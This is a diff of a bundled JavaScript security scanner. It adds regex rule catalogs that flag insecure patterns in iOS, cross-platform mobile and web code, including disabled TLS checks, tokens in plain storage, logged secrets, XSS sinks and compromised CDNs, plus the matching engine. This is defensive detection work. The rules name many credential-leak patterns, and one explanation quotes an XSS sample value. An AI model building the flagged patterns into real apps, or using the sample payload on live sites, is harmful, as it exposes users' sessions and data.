+  rule("IOS-CRY-02", "critical", "ios", F.swiftObjc, /CCCrypt\s*\([^)]*,\s*(nil|NULL|\[UInt8\]\(repeating:\s*0)/, "CommonCrypto with a zero or missing IV", "A fixed IV makes encryption deterministic and breaks CBC security.", "Use CryptoKit AES.GCM (random nonce per message).", ["CWE-329"]),
+  rule("IOS-CRY-03", "medium", "ios", F.swiftObjc, /\bCC_(MD5|SHA1)\s*\(|Insecure\.(MD5|SHA1)\b/, "MD5 or SHA-1", "Collisions are practical; unsafe for integrity or passwords.", "Use SHA256 (CryptoKit).", ["CWE-328"]),
+  rule("IOS-CRY-04", "high", "ios", F.swiftObjc, /\b(rand|random|srand|srandom)\s*\(\s*\)[\s\S]{0,120}(token|nonce|key|salt|otp)/i, "Predictable random for a security value", "rand()/random() are predictable.", "Use SecRandomCopyBytes or SystemRandomNumberGenerator.", ["CWE-338"]),
+  rule("IOS-CRY-06", "medium", "ios", F.swift, /evaluatePolicy\s*\(\s*\.deviceOwnerAuthentication(WithBiometrics)?/, "Biometric check not bound to the Keychain", "A boolean result is easy to bypass with hooking tools.", "Protect the secret with SecAccessControl(.biometryCurrentSet) so the Keychain releases it only after Face ID / Touch ID.", ["MASVS-AUTH"], { unless: /SecAccessControlCreateWithFlags|biometryCurrentSet/ }),
+  // ── Network
+  rule("IOS-NET-01", "critical", "ios", F.swift, /DisabledTrustEvaluator|DisabledEvaluator|\.disableEvaluation|validateCertificateChain\s*:\s*false/, "Server trust evaluation disabled", "Any certificate is accepted; traffic can be intercepted.", "Use default evaluation, or PinnedCertificatesTrustEvaluator / PublicKeysTrustEvaluator.", ["CWE-295"]),
+  rule("IOS-NET-02", "medium", "ios", F.plist, /<key>NSPinnedDomains<\/key>/, "No certificate pinning", "A user-installed or rogue CA can intercept auth and payment traffic.", "Pin your API with NSPinnedDomains (iOS 14+) or TrustKit, with a backup key.", ["MASVS-NETWORK"], { absent: true, when: /<key>CFBundleIdentifier<\/key>/ }),
+  rule("IOS-NET-03", "medium", "ios", /\.(swift|m|plist|xcconfig|json)$/, /["'>]http:\/\/(?!localhost|127\.0\.0\.1|www\.apple\.com\/DTDs|purl\.org|www\.w3\.org)[\w.-]+/, "Plain HTTP endpoint", "Traffic can be read and changed on the network.", "Use https.", ["CWE-319"]),
+  rule("IOS-NET-04", "medium", "ios", F.swift, /URLQueryItem\s*\(\s*name\s*:\s*"(api_?key|apikey|client_secret|secret|token|access_token)"/i, "Secret sent in the URL", "Query strings end up in server and proxy logs.", "Send it in a header or proxy the API through your backend.", ["CWE-598"]),
+  rule("IOS-NET-05", "high", "ios", F.swift, /(NetworkLogger|NFX\.sharedInstance\(\)\.start|PulseUI|netfox)/, "Network inspector in the app", "Request and response bodies (tokens, personal data) are recorded on the device.", "Wrap it in #if DEBUG.", ["CWE-532"], { unless: /#if\s+DEBUG/ }),
+  // ── Auth
+  rule("IOS-AUT-01", "high", "ios", F.swift, /WKWebView[\s\S]{0,800}(oauth|authorize\?|response_type=)/i, "OAuth login inside a WKWebView", "The app can read the user's credentials and Google/Apple block embedded logins.", "Use ASWebAuthenticationSession with PKCE.", ["RFC 8252"], { unless: /ASWebAuthenticationSession/ }),
+  rule("IOS-AUT-04", "medium", "ios", F.swift, /ASAuthorizationAppleIDProvider\(\)\.createRequest\(\)/, "Sign in with Apple without a nonce", "Without a nonce the identity token can be replayed.", "Set request.nonce to the SHA-256 of a random nonce and verify it on the server.", [], { unless: /\.nonce\s*=/ }),
+  // ── Logging
+  rule("IOS-LOG-01", "medium", "ios", F.swiftObjc, /\b(print|NSLog|debugPrint|os_log|logger\.\w+)\s*\([^)\n]*\b(password|token|secret|otp|authorization|cookie|credential)/i, "Secret logged", "Device logs are readable with a cable and appear in sysdiagnoses.", "Remove it or log with privacy: .private.", ["CWE-532"]),
+  rule("IOS-LOG-03", "medium", "ios", F.swift, /advertisingIdentifier/, "IDFA read without tracking permission", "Reading the IDFA without the App Tracking Transparency prompt breaks App Store rules.", "Request ATTrackingManager.requestTrackingAuthorization first.", ["MASVS-PRIVACY"], { unless: /ATTrackingManager/ }),
+  // ── Build and code
+  rule("IOS-BLD-02", "critical", "ios", /\.(p12|p8|mobileprovision|cer)$/, void 0, "Signing certificate, provisioning profile or API key committed", "With these, anyone can sign builds or call App Store Connect / APNs as you.", "Remove them and their history; use fastlane match with an encrypted repo or CI secrets.", ["CWE-522"], { fileOnly: true, tests: true }),
+  rule("IOS-BLD-06", "medium", "ios", F.swiftObjc, /JSContext\s*\(\s*\)[\s\S]{0,400}evaluateScript\s*\(/, "JavaScript executed from data", "Downloaded scripts change app behaviour outside review and can be tampered with.", "Do not run downloaded code; if needed, sign and verify scripts.", ["CWE-494"]),
+  rule("IOS-BLD-07", "medium", "ios", /\.(m|mm|c|cpp|h)$/, /\b(strcpy|strcat|sprintf|gets|vsprintf)\s*\(/, "Unsafe C string function", "These overflow on long input.", "Use strlcpy, snprintf, and length checks.", ["CWE-120"]),
+  rule("IOS-BLD-08", "medium", "ios", /\.(m|mm)$/, /NSLog\s*\(\s*[a-z]\w*\s*\)|stringWithFormat:\s*[a-z]\w*\s*\]/, "Format string from a variable", "A value containing %@ or %n can crash or read memory.", 'Use a literal format: NSLog(@"%@", value).', ["CWE-134"]),
+  // ── Injection and parsing
+  rule("IOS-INJ-01", "high", "ios", F.swiftObjc, /sqlite3_(exec|prepare_v2)\s*\([^,]+,\s*("[^"]*\\\(|\w+\s*\+)|executeQuery\s*\(\s*"[^"]*\\\(/, "SQL built from strings", "Interpolated values can change the query.", "Use bound parameters (sqlite3_bind_*, ? placeholders).", ["CWE-89"]),
+  rule("IOS-INJ-02", "medium", "ios", F.swift, /NSPredicate\s*\(\s*format\s*:\s*"[^"]*\\\(/, "NSPredicate built from interpolated strings", "Input becomes predicate syntax.", 'Use %@ arguments: NSPredicate(format: "name == %@", value).', ["CWE-943"]),
+  rule("IOS-INJ-03", "high", "ios", F.swiftObjc, /NSKeyedUnarchiver\.unarchiveObject\s*\(|unarchiveTopLevelObjectWithData|requiresSecureCoding\s*=\s*false/, "Insecure keyed unarchiving", "Decoding untrusted archives can instantiate arbitrary classes.", "Use unarchivedObject(ofClass:from:) with NSSecureCoding, or Codable.", ["CWE-502"]),
+  rule("IOS-INJ-04", "medium", "ios", F.swift, /shouldResolveExternalEntities\s*=\s*true/, "XML external entities enabled", "Untrusted XML can read local files (XXE).", "Leave shouldResolveExternalEntities false.", ["CWE-611"])
+];
+
+// src/security/catalog/mobile.ts
+var CROSS_MOBILE = [
+  // ── React Native / Expo
+  rule("XPM-02", "critical", "rn", F.js, /AsyncStorage\.setItem\s*\(\s*["'`]\w*(token|jwt|auth|session|password|secret)\w*["'`]/i, "Token in AsyncStorage", "AsyncStorage is an unencrypted file (and plain SharedPreferences/plist).", "Use react-native-keychain or expo-secure-store.", ["CWE-312"]),
+  rule("XPM-01", "critical", "rn", /(^|\/)(app\.json|app\.config\.[jt]s)$/, /"?extra"?\s*:\s*\{[\s\S]*?\w*(secret|private|password|service_?role)\w*["']?\s*:/i, "Secret in Expo config", "app.json `extra` ships inside the bundle; anyone can read it.", "Keep secrets on a server; ship only public ids.", ["CWE-798"]),
+  rule("XPM-04", "critical", "rn", F.js, /trustAllCerts|rejectUnauthorized\s*:\s*false|disableAllSecurity\s*:\s*true|sslPinning\s*:\s*\{\s*certs\s*:\s*\[\s*\]/, "TLS verification turned off", "Any network attacker can read and change the app's traffic.", "Remove it; pin with react-native-ssl-pinning if needed.", ["CWE-295"]),
+  rule("XRN-01", "high", "rn", F.js, /originWhitelist\s*=\s*\{\s*\[\s*["']\*["']\s*\]\s*\}/, "WebView allows any origin", "Any page can load and post messages to the app.", "List the origins the WebView may load.", ["CWE-939"]),
+  rule("XRN-01", "high", "rn", F.js, /onMessage\s*=\s*\{/, "WebView bridge without an origin check", "Any page shown in the WebView can send messages the app acts on.", "Check event.nativeEvent.url against an allowlist before acting.", ["CWE-749"], { when: /react-native-webview/, unless: /nativeEvent\.url|allowedOrigins|origin/ }),
+  rule("XRN-02", "high", "rn", F.js, /allowUniversalAccessFromFileURLs\s*=\s*\{\s*true|allowFileAccessFromFileURLs\s*=\s*\{\s*true|mixedContentMode\s*=\s*["']always["']/, "WebView file or mixed-content access", "Local files can be read by page scripts, or HTTP content injected.", "Remove these props.", ["CWE-200"]),
+  rule("XRN-02", "medium", "rn", F.js, /javaScriptCanOpenWindowsAutomatically\s*=\s*\{\s*true|injectedJavaScript\s*=\s*\{\s*`[^`]*\$\{/, "WebView injected script from data", "Values inside injected JS run as code in the page.", "JSON.stringify values passed into injected scripts.", ["CWE-79"]),
+  rule("XPM-10", "medium", "rn", F.js, /console\.(log|debug|info)\s*\([^)\n]*(token|password|secret|otp|authorization)/i, "Secret logged", "RN console logs reach logcat / device logs in release.", "Remove it, and strip console with babel-plugin-transform-remove-console in release.", ["CWE-532"]),
+  rule("XPM-06", "high", "rn", /(^|\/)(app\.json|app\.config\.[jt]s|Info\.plist|strings\.xml)$/, /CodePushServerURL["']?\s*[:=>]\s*["'<]?http:|"updates"\s*:\s*\{[^}]*"url"\s*:\s*"http:/, "Over-the-air updates over HTTP", "Anyone on the network can push code to the app.", "Use HTTPS and code signing for updates (expo-updates codeSigningCertificate).", ["CWE-494"]),
+  rule("XPM-06", "medium", "rn", /(^|\/)(app\.json|app\.config\.[jt]s)$/, /"updates"\s*:\s*\{/, "OTA updates without code signing", "Whoever controls the update server (or its account) ships code to every user.", "Configure updates.codeSigningCertificate.", ["CWE-494"], { unless: /codeSigningCertificate/ }),
+  // ── Flutter
+  rule("XPM-02", "critical", "flutter", F.dart, /(prefs|preferences|SharedPreferences\S*)\.set(String|Bool)\s*\(\s*["']\w*(token|jwt|auth|session|password|secret)\w*["']/i, "Token in shared_preferences", "shared_preferences is plain storage.", "Use flutter_secure_storage.", ["CWE-312"]),
+  rule("XPM-04", "critical", "flutter", F.dart, /badCertificateCallback\s*=\s*\([^)]*\)\s*(=>\s*true|\{\s*return\s+true)/, "TLS verification turned off", "Every certificate is accepted.", "Remove the callback; pin with a SecurityContext if needed.", ["CWE-295"]),
+  rule("XFL-01", "high", "flutter", F.dart, /JavaScriptMode\.unrestricted[\s\S]{0,500}(addJavaScriptChannel|JavascriptChannel)/, "WebView JS channel with unrestricted JavaScript", "Any page in the WebView can call the native channel.", "Load only allowlisted URLs (NavigationDelegate) and check the source in the channel.", ["CWE-749"]),
+  rule("XFL-03", "medium", "flutter", F.kotlinJava, /setMethodCallHandler\s*\{[\s\S]{0,600}(File\(|startActivity|Intent\(|Uri\.parse)/, "Platform channel acts on Dart arguments", "Arguments decide files, intents or URLs on the native side.", "Validate every argument on the native side.", ["CWE-20"]),
+  rule("XPM-10", "medium", "flutter", F.dart, /\b(print|debugPrint|log)\s*\([^)\n]*(token|password|secret|otp|authorization)/i, "Secret logged", "Logs reach logcat and device logs.", "Remove it.", ["CWE-532"]),
+  rule("XFL-02", "high", "flutter", F.dart, /String\.fromEnvironment\s*\(\s*["']\w*(SECRET|PRIVATE|PASSWORD|SERVICE_ROLE)\w*["']/, "Secret passed with --dart-define", "dart-define values are compiled into the binary.", "Keep secrets on a server.", ["CWE-798"]),
+  // ── Kotlin Multiplatform
+  rule("XKM-01", "high", "kmp", /\/iosMain\/.+\.kt$/, /NSUserDefaults\.standardUserDefaults[\s\S]{0,200}(token|password|secret|session)/i, "iOS side stores secrets in NSUserDefaults", "The iOS actual of the storage keeps tokens in a plain plist.", "Use the Keychain on iOS (e.g. KeychainSettings).", ["CWE-312"]),
+  rule("XKM-01", "high", "kmp", /\/commonMain\/.+\.kt$/, /(Settings\(\)|settings)\.(putString|set)\s*\(\s*"\w*(token|password|secret|session)\w*"/i, "Shared settings hold a token", "multiplatform-settings is unencrypted on both platforms by default.", "Use an encrypted settings implementation (EncryptedSharedPreferences / Keychain) for secrets.", ["CWE-312"]),
+  rule("XKM-02", "critical", "kmp", /\.kt$/, /handleChallenge\s*\{[\s\S]{0,300}NSURLSessionAuthChallengeUseCredential|trustManager\s*=\s*object\s*:\s*X509TrustManager/, "Ktor client trusts every certificate", "Traffic on that platform can be intercepted.", "Remove the override; use certificate pinning instead.", ["CWE-295"]),
+  rule("XKM-03", "low", "kmp", /\.kt$/, /(Napier\.base\(DebugAntilog\(\)\)|Logger\.setMinSeverity\(Severity\.Verbose\))/, "Verbose shared logging always on", "Debug logs ship in release on both platforms.", "Initialise debug logging only in debug builds.", ["CWE-532"], { unless: /isDebug|BuildConfig\.DEBUG|Platform\.isDebugBinary/ }),
+  // ── Ionic / Capacitor / Cordova
+  rule("XHY-02", "high", "hybrid", /(^|\/)config\.xml$/, /<(access\s+origin|allow-navigation\s+href)\s*=\s*"\*"/, "Cordova allows every origin", "The WebView (with native plugins) can load or call any site.", "List the hosts the app needs.", ["CWE-939"]),
+  rule("XHY-03", "high", "hybrid", /capacitor\.config\.(json|[jt]s)$/, /cleartext\s*["']?\s*:\s*true|"?url"?\s*:\s*["']http:\/\//, "Capacitor live-reload or cleartext config", "The app loads code from a dev server or over HTTP.", "Remove server.url / cleartext from release config.", ["CWE-319"]),
+  rule("XHY-05", "medium", "hybrid", /(^|\/)(www|src|public)\/index\.html$/, /Content-Security-Policy/, "No Content-Security-Policy in the hybrid app", "XSS in a hybrid app reaches native plugins (camera, files, contacts).", "Add a CSP meta tag that allows only your own scripts.", ["CWE-693"], { absent: true }),
+  rule("XHY-01", "high", "hybrid", F.js, /cordova\.InAppBrowser\.open\s*\([^)]*,\s*["']_self["']/, "Untrusted page opened inside the app WebView", "With _self the page gets Cordova plugin access.", "Open external pages with _system or _blank.", ["CWE-749"]),
+  // ── .NET MAUI / Xamarin
+  rule("XMA-01", "critical", "maui", F.cs, /ServerCertificateCustomValidationCallback\s*=\s*[^;]*=>\s*true/, "TLS verification turned off", "Every certificate is accepted.", "Remove the callback.", ["CWE-295"]),
+  rule("XMA-03", "high", "maui", F.cs, /Preferences\.(Default\.)?Set\s*\(\s*"\w*(token|password|secret|session)\w*"/i, "Token in Preferences", "Preferences are plain storage.", "Use SecureStorage.", ["CWE-312"])
+];
+
+// src/security/catalog/web.ts
+var WEB = [
+  // ── XSS
+  rule("WEB-XSS-01", "high", "web", F.js, /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?!["'`][^"'`$]*["'`]\s*\})/, "Raw HTML rendered in React", "If any part of the HTML comes from users or the server, it runs scripts in your origin (XSS).", "Render text, or sanitise with DOMPurify.sanitize() right at the sink.", ["CWE-79"], { unless: /DOMPurify|sanitize\(/ }),
+  rule("WEB-XSS-01", "high", "web", /\.(vue|html)$/, /\sv-html\s*=/, "Raw HTML rendered in Vue (v-html)", "User or server HTML in v-html runs scripts in your origin.", "Use text interpolation, or sanitise with DOMPurify.", ["CWE-79"], { unless: /DOMPurify|sanitize/ }),
+  rule("WEB-XSS-01", "high", "web", /\.(html|ts)$/, /\[innerHTML\]\s*=/, "Raw HTML bound in Angular", "Angular sanitises, but anything marked trusted or bypassed elsewhere runs here.", "Bind text, or sanitise explicitly.", ["CWE-79"], { when: /@Component|<\w+/ }),
+  rule("WEB-XSS-01", "high", "web", /\.svelte$/, /\{@html\s/, "Raw HTML rendered in Svelte", "{@html} renders unsanitised HTML.", "Sanitise with DOMPurify first.", ["CWE-79"], { unless: /DOMPurify|sanitize/ }),
+  rule("WEB-XSS-01", "high", "web", F.js, /\.(innerHTML|outerHTML)\s*\+?=\s*(?!["'`][^"'`$]*["'`]\s*;?\s*$)[^;\n]+|\.insertAdjacentHTML\s*\(|document\.write(ln)?\s*\(/m, "HTML written into the DOM", "Values that reach innerHTML/insertAdjacentHTML/document.write run as HTML and script.", "Use textContent or createElement; sanitise with DOMPurify if HTML is required.", ["CWE-79"], { unless: /DOMPurify|sanitize\(/ }),
+  rule("WEB-XSS-02", "high", "web", F.js, /bypassSecurityTrust(Html|Script|Url|ResourceUrl|Style)\s*\(/, "Angular sanitiser bypassed", "The value is trusted as-is; user data here is XSS.", "Only bypass for constants you control.", ["CWE-79"]),
+  rule("WEB-XSS-02", "high", "web", F.js, /DOMPurify\.sanitize\s*\([^)]*ADD_TAGS\s*:\s*\[[^\]]*['"]script/, "DOMPurify configured to allow script", "Allowing script tags defeats the sanitiser.", "Remove script from ADD_TAGS.", ["CWE-79"]),
+  rule("WEB-XSS-03", "high", "web", F.js, /href\s*=\s*\{\s*(?!["'`])[\w.?[\]]+\s*\}/, "Link target from data", "A value like javascript:alert(1) runs code when clicked.", "Allow only http(s)/mailto URLs (new URL(v).protocol check) before rendering.", ["CWE-79"], { unless: /protocol\s*===?\s*["']https?:|isSafeUrl|sanitizeUrl/, when: /(user|profile|link|url|website|homepage)/i }),
+  rule("WEB-XSS-04", "high", "web", F.js, /\beval\s*\(\s*(?!["'`][^"'`]*["'`]\s*\))|\bnew\s+Function\s*\(|\bset(Timeout|Interval)\s*\(\s*["'`]/, "Code built from strings", "Any untrusted part of the string runs as JavaScript.", "Remove eval/new Function; pass functions to setTimeout.", ["CWE-95"]),
+  rule("WEB-XSS-05", "high", "web", F.js, /(location\.(hash|search|href)|document\.(referrer|URL)|window\.name)[\s\S]{0,120}\.(innerHTML|outerHTML)\s*=|\.(innerHTML|outerHTML)\s*=[^;\n]*(location\.(hash|search)|document\.referrer|window\.name)/, "URL data flows into HTML (DOM XSS)", "A crafted link runs script in the victim's session.", "Read the value as text and escape it, or sanitise it.", ["CWE-79"]),
+  rule("WEB-XSS-06", "medium", "web", F.js, /new\s+MarkdownIt\s*\(\s*\{[^}]*html\s*:\s*true|marked\.setOptions\s*\(\s*\{[^}]*sanitize\s*:\s*false/, "Markdown renderer allows raw HTML", "Markdown from users can carry script tags.", "Turn HTML off or sanitise the output with DOMPurify.", ["CWE-79"], { unless: /DOMPurify/ }),
+  rule("WEB-XSS-09", "medium", "web", F.js, /(_\.merge|lodash\.merge|_\.defaultsDeep|deepmerge|_\.set)\s*\([^)]*(req\.(body|query)|JSON\.parse\s*\(|params|input)/, "Deep merge of untrusted objects (prototype pollution)", "A __proto__ key in the input changes every object in the app.", "Validate input with a schema, or use Object.create(null) and reject __proto__/constructor keys.", ["CWE-1321"]),
+  // ── Secrets in the bundle
+  rule("WEB-SEC-01", "critical", "web", /\.(m?[jt]sx?|vue|svelte)$|(^|\/)\.env[\w.-]*$/, /\b(NEXT_PUBLIC_|VITE_|REACT_APP_|EXPO_PUBLIC_|NUXT_PUBLIC_|PUBLIC_)\w*(SECRET|PRIVATE|SERVICE_ROLE|PASSWORD|ADMIN)\w*/, "Server secret exposed to the browser", "Public env prefixes are inlined into the client bundle; every visitor can read the value.", "Drop the public prefix and use the secret only in server code.", ["CWE-798"]),
+  rule("WEB-SEC-01", "critical", "web", /(^|\/)\.env[\w.-]*$/, /^(NEXT_PUBLIC_|VITE_|REACT_APP_|EXPO_PUBLIC_)\w*\s*=\s*(sk_live_|sk-|eyJhbGciOi[\w-]+\.eyJ[\w-]*cm9sZSI6InNlcnZpY2Vfcm9sZ)/m, "Secret key in a public env variable", "This key is inlined into the client bundle.", "Use a server-only variable and rotate the key.", ["CWE-798"], { secret: true }),
+  rule("WEB-SEC-01", "critical", "web", F.js, /createClient\s*\([^)]*(SERVICE_ROLE|service_role)/, "Supabase service-role key used in client code", "The service role bypasses row-level security: anyone can read and write every table.", "Use the anon key in the browser; keep service-role on the server.", ["CWE-284"], { unless: /["']use server["']|server-only|\/api\// }),
+  rule("WEB-SEC-02", "low", "web", /(vite|webpack|next|vue)\.config\.(m?[jt]s|cjs)$/, /productionSourceMap\s*:\s*true|sourcemap\s*:\s*true|devtool\s*:\s*["'](source-map|eval)/, "Source maps published in production", "Anyone can read your original source code, comments and internal paths.", "Use 'hidden-source-map' and upload maps to your error tracker only.", ["CWE-540"]),
+  rule("WEB-SEC-04", "critical", "web", /(firestore|database|storage)\.rules$|\.rules\.json$/, /allow\s+(read|write|read,\s*write)\s*:\s*if\s+true|"\.(read|write)"\s*:\s*true/, "Firebase rules open to everyone", "Anyone can read or write the whole database/bucket with the public config.", "Require request.auth and check ownership in each rule.", ["CWE-284"]),
+  // ── Client-side auth
+  rule("WEB-AUT-01", "medium", "web", F.js, /(localStorage|sessionStorage)\.setItem\s*\(\s*["'`]\w*(token|jwt|auth|session|access|refresh)\w*["'`]/i, "Token kept in Web Storage", "Any XSS (or a third-party script) can read localStorage and steal the session.", "Keep the session in an HttpOnly, Secure, SameSite cookie.", ["CWE-922"]),
+  rule("WEB-AUT-03", "high", "web", F.js, /response_type\s*[=:]\s*["'`]?(token|id_token token)\b/, "OAuth implicit flow", "Tokens in the URL fragment leak through history and referrers; the flow is deprecated.", "Use the authorization code flow with PKCE.", ["CWE-352"]),
+  rule("WEB-AUT-04", "medium", "web", F.js, /jwt[_-]?decode\s*\([^)]*\)\s*(\.|\[)\s*["'`]?(role|roles|isAdmin|admin|permissions|scope)/i, "Role read from a JWT on the client", "A decoded (unverified) token is only a hint; the server must enforce the role.", "Use it for display only; check permissions on every API call.", ["CWE-345"]),
+  rule("WEB-AUT-06", "low", "web", /\.(html|[jt]sx|vue|svelte)$/, /<form(?![^>]*method\s*=\s*["']?post)[^>]*>(?:(?!<\/form>)[\s\S])*type\s*=\s*["']password/i, "Password form submitted with GET", "The password ends up in the URL, browser history and server logs.", 'Use method="post".', ["CWE-598"], { unless: /onSubmit|@submit|preventDefault|handleSubmit/ }),
+  // ── Cross-origin
+  rule("WEB-ORG-01", "high", "web", F.js, /addEventListener\s*\(\s*["']message["']\s*,/, "postMessage handler without an origin check", "Any page that can frame or open yours can send it messages.", "Check event.origin against an allowlist before using event.data.", ["CWE-346"], { unless: /\.origin\s*(!==?|===?)|allowedOrigins|ALLOWED_ORIGINS|origin\s*!==|includes\(\s*\w*\.origin/ }),
+  rule("WEB-ORG-02", "medium", "web", F.js, /\.postMessage\s*\([^)]*,\s*["']\*["']\s*\)/, "postMessage to any origin", "If the target window navigated, the data goes to whoever is there now.", "Pass the exact target origin.", ["CWE-201"]),
+  rule("WEB-ORG-03", "medium", "web", F.js, /(window\.)?location(\.href)?\s*=\s*[^;\n]*(searchParams\.get|query\.|params\.|getParameter)\s*\(?\s*["'](next|redirect|return|returnUrl|url|continue|goto)/i, "Open redirect", "Attackers use your domain to send users to phishing pages after login.", "Allow only relative paths or allowlisted hosts.", ["CWE-601"]),
+  rule("WEB-ORG-04", "low", "web", /\.(html|[jt]sx|vue|svelte)$/, /target\s*=\s*["']_blank["'](?![^>]*rel\s*=\s*["'][^"']*noopener)/, "target=_blank without rel=noopener", "In older browsers the new page can redirect your tab (reverse tabnabbing).", 'Add rel="noopener noreferrer".', ["CWE-1022"]),
+  rule("WEB-ORG-05", "medium", "web", /\.(html|[jt]sx|vue|svelte)$/, /<iframe(?![^>]*sandbox)[^>]*src\s*=\s*\{?\s*(?!["'](https:\/\/(www\.)?(youtube|player\.vimeo|google)))/i, "iframe of dynamic content without sandbox", "Untrusted framed content can run scripts and navigate the top page.", "Add a sandbox attribute with only the permissions it needs.", ["CWE-1021"]),
+  rule("WEB-ORG-06", "medium", "web", F.js, /credentials\s*:\s*["']include["']/, "Cookies sent with cross-origin requests", "If the URL is not your own API, session cookies go to a third party.", "Use credentials: 'same-origin' unless the target is your own API on another subdomain.", ["CWE-201"], { when: /fetch\s*\(\s*["'`]https?:\/\/(?!localhost)/ }),
+  // ── Headers and page policy (in code)
+  rule("WEB-HDR-01", "medium", "web", /\.(html|m?[jt]s)$/, /Content-Security-Policy[^\n]*script-src[^\n]*('unsafe-inline'|'unsafe-eval'|\s\*[\s;'"])/, "Weak Content-Security-Policy", "unsafe-inline / unsafe-eval / * leaves XSS exploitable.", "Use nonces or hashes for scripts and drop unsafe-inline/unsafe-eval.", ["CWE-693"]),
+  rule("WEB-HDR-08", "medium", "web", /\.(html|[jt]sx|vue|svelte)$/, /<(script|link|img|iframe)[^>]*(src|href)\s*=\s*["']http:\/\/(?!localhost|127\.0\.0\.1)/, "Resource loaded over HTTP", "A network attacker can replace the script or style.", "Use https.", ["CWE-319"]),
+  rule("WEB-HDR-09", "low", "web", /\.html?$/, /<script[^>]*src\s*=\s*["']https:\/\/(?!(www\.)?(googletagmanager|google-analytics|gstatic)\.)[^"']*\/\/?[^"']*["'](?![^>]*integrity)[^>]*>/, "CDN script without Subresource Integrity", "If the CDN is compromised, the script runs in your pages.", 'Add integrity="sha384-\u2026" crossorigin="anonymous" (or self-host).', ["CWE-353"]),
+  rule("WEB-3P-02", "high", "web", /\.(html|[jt]sx?|vue|svelte)$/, /(polyfill\.io|cdn\.polyfill\.io|bootcss\.com|staticfile\.org|bootcdn\.net)/, "Script from a compromised CDN", "These domains served malware to sites that loaded them.", "Remove it; self-host or use a trusted CDN with SRI.", ["CWE-829"]),
+  rule("WEB-3P-03", "medium", "web", /\.html?$/, /jquery[-.]?(1\.\d+|2\.\d+|3\.[0-4]\.\d+)(\.min)?\.js/, "Old jQuery with known XSS issues", "jQuery before 3.5 has XSS bugs in HTML parsing.", "Upgrade to jQuery 3.5+ or remove it.", ["CWE-1104"]),
+  // ── Storage, PWA, forms
+  rule("WEB-STO-02", "medium", "web", /(sw|service-?worker|workbox)[^/]*\.(m?[jt]s)$|vite\.config\.(m?[jt]s)$|next\.config\.(m?[jt]s)$/, /urlPattern\s*:\s*[^,\n]*\/api|registerRoute\s*\([^)]*\/api/, "Service worker caches API responses", "Personal data stays in the browser cache after logout and on shared machines.", "Use NetworkOnly for authenticated APIs, or clear caches on logout.", ["CWE-524"]),
+  rule("WEB-STO-04", "medium", "web", F.js, /[?&](token|access_token|api_key|apikey|password|session)=\$\{/, "Secret in a URL", "URLs are stored in history, logs and sent in the Referer header.", "Send it in a header or POST body.", ["CWE-598"]),
+  rule("WEB-FRM-04", "low", "web", F.js, /new\s+RegExp\s*\(\s*(req\.|input|query|params|user)/, "Regex built from user input", "Crafted input can make the regex take seconds (ReDoS) or match more than intended.", "Escape the input or avoid dynamic regexes.", ["CWE-1333"]),
+  // ── Browser extensions
+  rule("WEB-EXT-01", "medium", "web", /(^|\/)manifest\.json$/, /"(permissions|host_permissions)"\s*:\s*\[[^\]]*"(<all_urls>|\*:\/\/\*\/\*|https?:\/\/\*\/\*)"/, "Extension can access every site", "A compromise of the extension reads all browsing data.", "Request only the hosts it needs (or activeTab).", []),
+  rule("WEB-EXT-03", "high", "web", /(^|\/)manifest\.json$/, /"externally_connectable"\s*:\s*\{[^}]*"matches"\s*:\s*\[[^\]]*"\*:\/\/\*\/\*"/, "Any site can message the extension", "Every web page can call the extension's message handlers.", "List only your own domains in externally_connectable.matches.", ["CWE-346"]),
+  rule("WEB-EXT-04", "high", "web", /(^|\/)manifest\.json$/, /"content_security_policy"\s*:\s*"[^"]*unsafe-eval/, "Extension allows eval", "Remote or injected strings can run as code with extension privileges.", "Remove unsafe-eval.", ["CWE-494"])
+];
+
+// src/security/catalog/index.ts
+var RULES = [...COMMON, ...ANDROID, ...IOS, ...WEB, ...BACKEND, ...CROSS_MOBILE, ...DESKTOP];
+function rulesFor(platforms) {
+  return RULES.filter((r) => r.platform === "common" || platforms.has(r.platform));
+}
+
+// src/security/deps.ts
+var import_node_path37 = require("node:path");
+var import_yaml8 = __toESM(require_dist(), 1);
+
+// src/security/static.ts
+var import_node_fs27 = require("node:fs");
+var import_node_path36 = require("node:path");
+var MAX_BYTES = 1024 * 1024;
+var IGNORE = /probe-security-ignore[:\s]+([A-Z]{2,4}-[\w-]+(?:\s*,\s*[A-Z]{2,4}-[\w-]+)*)/;
+function runStatic(root, files, rules, options) {
+  const active = rules.filter((r) => !options.skip.some((s) => r.id === s || s.endsWith("-") && r.id.startsWith(s)));
+  const out = [];
+  for (const file of files) {
+    const mine = active.filter((r) => r.files.test(file));
+    if (!mine.length) continue;
+    const test = isTestPath(file);
+    const presence = mine.filter((r) => r.fileOnly && (r.tests || !test));
+    for (const r of presence) out.push(finding(r, file, void 0, file, options.owner(file)));
+    const readers = mine.filter((r) => !r.fileOnly && (r.tests || !test));
+    if (!readers.length) continue;
+    const text2 = readText((0, import_node_path36.join)(root, file));
+    if (text2 === null) continue;
+    for (const r of readers) out.push(...matchRule(r, file, text2, options.owner(file)));
+  }
+  return out;
+}
+function matchRule(r, file, text2, feature) {
+  if (r.when && !r.when.test(text2)) return [];
+  if (r.unless && r.unless.test(text2)) return [];
+  if (r.absent) {
+    if (r.match && r.match.test(text2)) return [];
+    return [finding(r, file, void 0, `${file}: ${r.title.charAt(0).toLowerCase()}${r.title.slice(1)}`, feature)];
+  }
+  if (!r.match) return [];
+  const out = [];
+  const re = new RegExp(r.match.source, r.match.flags.includes("g") ? r.match.flags : `${r.match.flags}g`);
+  const lines = lineStarts(text2);
+  let m;
+  let hits = 0;
+  while ((m = re.exec(text2)) !== null && hits < 20) {
+    if (m[0].length === 0) {
+      re.lastIndex++;
+      continue;
+    }
+    const line = lineOf(lines, m.index);
+    if (!ignored(text2, lines, line, r.id)) {
+      out.push(finding(r, file, line + 1, m[0], feature));
+      hits++;
+    }
+  }
+  return out;
+}
+function finding(r, file, line, evidence, feature) {
+  const shown = evidence.replace(/\s+/g, " ").trim().slice(0, 240);
+  return makeFinding({
+    check: r.id,
+    title: r.title,
+    severity: r.severity,
+    layer: "static",
+    file,
+    line,
+    evidence: r.secret ? mask(shown) : shown,
+    why: r.why,
+    fix: r.fix,
+    refs: r.refs,
+    feature
+  });
+}
+function readText(path) {
+  try {
+    if ((0, import_node_fs27.statSync)(path).size > MAX_BYTES) return null;
+    const buf = (0, import_node_fs27.readFileSync)(path);
+    if (buf.subarray(0, 8e3).includes(0)) return null;
+    return buf.toString("utf8");
+  } catch {
+    return null;
+  }
+}
